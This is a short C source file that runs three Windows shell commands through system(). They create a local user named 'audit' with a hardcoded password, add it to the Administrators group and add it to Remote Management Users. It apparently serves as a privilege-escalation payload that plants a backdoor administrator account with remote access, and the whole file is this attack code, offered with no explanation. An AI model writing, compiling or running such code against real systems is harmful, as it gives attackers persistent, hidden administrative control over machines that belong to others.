#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user audit password123! /add");
  i = system ("net localgroup administrators audit /add");
  i = system ("net localgroup 'Remote Management Users' audit /add");
  
  return 0;
}
